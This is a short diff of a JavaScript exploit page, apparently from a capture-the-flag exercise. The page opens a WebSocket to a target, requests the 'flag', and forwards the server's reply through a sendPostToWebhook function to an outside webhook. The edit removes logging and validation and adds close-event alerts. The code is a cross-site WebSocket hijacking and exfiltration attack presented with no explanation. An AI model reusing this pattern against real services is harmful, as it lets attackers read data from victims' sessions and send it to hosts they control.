@@ -20,28 +20,20 @@
         const socket = new WebSocket(websocketURL);
 
         // Open WebSocket connection and send "flag" when connected
-        socket.addEventListener("open", (event) => {
+        socket.onopen = function(e) {
             socket.send("flag");
-        });
+        };
 
-        // Handle message received from WebSocket
-        socket.onmessage = (event) => {
-            let flag = event.data;
-            console.log("Received message:", flag);
+        socket.onmessage = function(event) {
+            const flag = event.data; // Capture the flag from the WebSocket message
+            sendPostToWebhook(flag); // Now send the POST request with the flag
+        };
 
-            // Check if flag is a non-empty string
-            if (typeof flag === "string" && flag.trim().length > 0) {
-                console.log("Flag is a non-empty string, sending POST request.");
-                
-                sendPostToWebhook(flag)
-                    .then(() => {
-                        console.log("POST request sent successfully!");
-                    })
-                    .catch((error) => {
-                        console.error("Error sending POST request:", error);
-                    });
+        socket.onclose = function(event) {
+            if (event.wasClean) {
+                alert(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
             } else {
-                console.log("Flag is empty or not a string, not sending POST request.");
+                alert('[close] Connection died');
             }
         };
 
